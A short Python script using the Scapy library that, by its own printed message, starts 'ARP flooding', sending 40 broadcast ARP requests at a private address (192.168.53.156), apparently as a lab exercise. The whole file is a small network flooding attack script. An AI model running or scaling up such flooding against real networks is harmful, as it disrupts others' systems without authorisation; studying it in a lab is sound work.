from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp
i=1
print("ARP flooding started...")
for _ in range(1,41):
    ether_frame=Ether(dst="ff:ff:ff:ff:ff:ff")
    arp=ARP(pdst="192.168.53.156")
    packet=ether_frame/arp
    ans=sendp(packet,verbose=False)
    print(f"Sented packet: {i}")
    i=i+1
    